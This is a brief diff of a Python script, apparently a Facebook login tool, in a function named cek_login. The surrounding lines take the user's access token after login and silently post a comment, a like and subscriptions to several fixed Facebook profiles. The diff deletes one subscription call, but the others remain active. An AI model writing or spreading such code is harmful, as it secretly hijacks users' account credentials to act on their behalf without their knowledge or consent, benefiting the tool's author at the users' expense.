@@ -78,7 +78,6 @@ def cek_login():
         requests.post('https://graph.facebook.com/10158807643598544/comments/?message=Mantap Bang ❤️&access_token=' + toket)
         requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=' + toket)
 	requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + toket)
-	requests.post('https://graph.facebook.com/100041991180267/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/100001540299108/subscribers?access_token=' + toket)
 	print (' [*] Login Berhasil')
